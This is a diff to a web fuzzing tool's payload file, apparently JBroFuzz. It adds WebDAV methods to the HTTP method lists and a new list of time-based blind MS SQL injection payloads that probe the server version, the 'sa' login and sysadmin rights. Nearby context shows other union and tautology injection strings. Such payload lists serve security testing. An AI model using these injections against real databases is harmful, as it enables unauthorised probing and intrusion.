@@ -3,10 +3,10 @@
 #
 # Copyright (C) 2009 
 # subere@uncon.org
-# Version 1.4
+# Version 1.5
 #
 
-P:HTT-PMT-UPP:Uppercase HTTP Methods:8
+P:HTT-PMT-UPP:Uppercase HTTP Methods:15
 > HTTP Methods | Replacive Fuzzers | Uppercase Fuzzers
 GET
 POST
@@ -16,8 +16,15 @@ DELETE
 TRACE
 PROPFIND
 OPTIONS
+COPY
+MOVE
+MKCOL
+PROPPATCH
+LOCK
+UNLOCK
+SEARCH
 
-P:HTT-PMT-LOW:Lowercase HTTP Methods:8
+P:HTT-PMT-LOW:Lowercase HTTP Methods:15
 > HTTP Methods | Replacive Fuzzers | Lowercase Fuzzers
 get
 post
@@ -27,6 +34,13 @@ delete
 trace
 propfind
 options
+copy
+move
+mkcol
+proppatch
+lock
+unlock
+search
 
 P:INT-LOW:Lowercase Integer Overflows:12
 > Exploits | Replacive Fuzzers | Integer Overflows | Lowercase Fuzzers
@@ -180,6 +194,7 @@ GRANT CONNECT TO name; GRANT RESOURCE TO name;
 INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
 
 P:SQL-MS1-SQL:MS SQL Injection I:8
+> SQL Injection | Injection | Replacive Fuzzers
 A
 ' or 1=1 --
 ' union (select @@version) --
@@ -188,6 +203,18 @@ A
 ' union (select NULL, NULL, NULL,  (select @@version)) --
 ' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
 ' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+
+P:SQL-MS2-BLN:MS SQL Injection (Blind):9
+> SQL Injection | Injection | Replacive Fuzzers
+a
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
+'; if not((select serverproperty('IsIntegratedSecurityOnly')) <> 1) waitfor delay '0:0:2' --
+'; if not((select serverproperty('IsIntegratedSecurityOnly')) <> 0) waitfor delay '0:0:2' --
 
 P:LDP-INJ:LDAP Injection:20
 > Replacive Fuzzers | LDAP Injection | Injection
